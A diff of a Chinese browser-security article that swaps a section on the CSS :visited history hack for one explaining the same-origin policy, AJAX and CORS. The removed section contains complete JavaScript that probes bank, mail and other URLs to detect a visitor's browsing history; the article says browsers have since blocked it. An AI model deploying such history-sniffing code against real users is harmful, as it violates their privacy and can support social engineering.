@@ -25,108 +25,37 @@ https://test.icehoney.me/secure.html    | Failure              | Different proto
 http://test.icehoney.me:81/secure.html  | Failure              | Different port
 http://blog.icehoney.me/secure.html     | Failure              | Different host
 
-##Link Style
- 
-CSS中有四个伪类用来定义链接的样式，分别是：a:link、a:visited、a:active和 a:hover，他们分别表示未访问的、已访问的、激活的和光标悬停
-在其上的链接，如下所示：
+由上表可知，影响“源”的因素有：host（域名或IP地址，如果是IP地址则看做一个根域名）、子域名、端口、协议。
 
-		a:link {color: #FF0000} 
-		a:visited {color: #00FF00}
-		a:hover {color: #FF00FF}
-		a:active {color: #0000FF}
+需要注意的是，对于当前页面来说，页面内存放JavaScript文件的域并不重要，重要的是加载JavaScript页面所在的域是什么。
 
-效果如下图：
+例如，在 baidu.com上有以下代码：
 
-![CSS Link Style](img/CSS-1.png)
+		<script src="http://google.com/ga.js"></script>
 
-其中青色的是访问过的网站，红色是未访问过的网站。一般来说，用户每天都会浏览很多网页，这些网页都会被浏览器记录下来，除非用户自己刻意清除，否则历史记录降一直
-保存在本地计算机中。倘若攻击者能获取用户浏览器的历史记录或搜索信息，将是一件十分危险的事，攻击者可以在此基础上进一步发起其他攻击，如社会工程学。
+baidu加载了google的ga.js，但是ga.js是运行在baidu.com页面中的，因此对于当前打开的页面(baidu.com页面)来说，ga.js的Origin就应该是baidu.com而非google.com。
 
-##如何获取历史记录
+在浏览器中，`<script>、<img>、<iframe>、<link>`等标签都可以跨域加载资源，而不受同源策略的限制。这些带"src"属性的标签每次加载时，实际上是由浏览器发起了一次GET请求。不同于 XMLHttpRequest 的是，通过src属性加载的资源，浏览器限制了JavaScript的权限，使其不能读、写返回的内容。
 
-黑客是怎样获取到用户的历史记录呢？这需要用到客户端JavaScript和CSS技术，两种技术结合在一起运用就可以知道某人是否访问过一个任意的URL，这种方式叫做“JavaScript/CSS history hack”。该技术主要利用了[Dom](https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model)中的[getComputedStyle()](https://developer.mozilla.org/en/docs/Web/API/window.getComputedStyle)方法来实现。
+##AJAX
 
-其原理就是利用CSS能定义访问过的和未访问过的超级链接的样式。由于JavaScript可以读取任何元素的CSS信息，自然能分辨浏览器应用了哪种样式和用户是否访问过该链接。
+随着互联网的发展，对用户体验的要求越来越高，AJAX应用也就越发频繁，AJAX的本质就是 XMLHttpRequest。但 XMLHttpRequest 受到同源策略的约束，不能跨域访问资源，在AJAX应用的开发中尤其需要注意这一点。
 
-		<H3>Visited</H3>
-		<ul id="visited"></ul>
+如果 XMLHttpRequest 能够跨域访问资源，则可能会导致一些敏感数据泄漏，例如CSRF的 token，从而导致发生安全问题。
 
-		<H3>Not Visited</H3>
-		<ul id="notvisited"></ul>
-		<script type="text/javascript">
-		var websites = [
-			"http://ha.ckers.org/blog/",
-			"http://login.yahoo.com/",
-			"http://mail.google.com/",
-			"http://mail.yahoo.com/",
-			"http://my.yahoo.com/",
-			"http://sla.ckers.org/forum/",
-			"http://slashdot.org/",
-			"http://www.amazon.com/",
-			"http://www.aol.com/",
-			"http://www.apple.com/",
-			"http://www.bankofamerica.com/",
-			"http://www.bankone.com/"
-		];
+##跨域解决方案
 
-		/* Loop through each URL */
-		for (var i = 0; i < websites.length; i++) {
-			
-			/* create the new anchor tag with the appropriate URL information */
-			var link = document.createElement("a");
-			link.id = "id" + i;
-			link.href = websites[i];
-			link.innerHTML = websites[i];
+随着互联网越来越开放，跨越请求的需求也越来越迫切。因此 W3C 委员会指定了 XMLHttpRequest 跨域访问标准。它需要通过目标域返回的HTTP头来授权是否允许跨域访问，因为HTTP头对于JavaScript来说一般是无法控制的，所以认为这个方案是可以实施的。
+注意：这个跨域访问方案的安全基础就是信任“JavaScript无法控制该HTTP头”，如果此信任基础被打破，则此方案也将不再安全。
 
-			/* create a custom style tag for the specific link. Set the CSS visited selector to a known value, in this case red */
-			document.write('<style>');
-			document.write('#id' + i + ":visited {color: #FF0000;}");
-			document.write('</style>');
-			
-			/* quickly add and remove the link from the DOM with enough time to save the visible computed color. */
-			document.body.appendChild(link);
-			var color = document.defaultView.getComputedStyle(link,null).getPropertyValue("color");
-			document.body.removeChild(link);
-			
-			/* check to see if the link has been visited if the computed color is red */
-			if (color == "rgb(255, 0, 0)") { // visited
-			
-				/* add the link to the visited list */
-				var item = document.createElement('li');
-				item.appendChild(link);
-				document.getElementById('visited').appendChild(item);
-				
-			} else { // not visited
-			
-				/* add the link to the not visited list */
-				var item = document.createElement('li');
-				item.appendChild(link);
-				document.getElementById('notvisited').appendChild(item);
-				
-			} // end visited color check if
+![Cross Origin](img/Same-Origin-Policy-2.png)
 
-		} // end URL loop
-		</script>
+由上图可以看出在页面`http://pan.baidu.com/disk/home` 向URL `http://localhost:6800/jsonrpc?tm=1428134320921` 发起了一次POST请求，
+这时并没有因为同源策略而遭到限制，因为在 Response Headers里面有一条: `Access-Control-Allow-Origin:*` 这句话声明了目标网址接受来自任何网址
+的跨域请求，所以浏览器允许了此次跨域请求。
 
-运行结果如下图：
+##总结
 
-![CSS hack](img/CSS-2.png)
+对于浏览器来说，除了DOM、Cookie、XMLHttpRequest 会受到同源策略的限制外，浏览器加载的一些第三方插件也有各自的同源策略。最常见的一些插件如 Flash、Java Applet、Silverlight、Google Gears等都有自己的控制策略。
 
-可以看到通过颜色区分了是否访问过，并且使用JavaScript进行罗列结果。Visited部分罗列的是曾经访问过的网站，Not Visited则是没有访问过的网站列表。
-
-
-##防范攻击
-
-CSS History Hack的防范属于浏览器安全的范畴，目前各大主流浏览器都已经通过限制getComputedStyle这个API封住了这个漏洞。
-
-如下图所示：
-
-![CSS hack](img/CSS-3.png)
-
-尽管CSS可以区分网站是否访问，但是JavaScript却无法获取到正常的返回值。无论是否访问过的URL，返回的color都是未访问的。
-
-##参考
-
-[Privacy and the :visited selector](https://developer.mozilla.org/en-US/docs/Web/CSS/Privacy_and_the_:visited_selector)
-
-[CSS History Hack](http://ha.ckers.org/weird/CSS-history-hack.html)
+浏览器的同源策略是浏览器安全的基础，同源策略一旦出现漏洞被绕过，也将带来非常严重的后果，很多基于同源策略制定的安全方案都将失去效果。
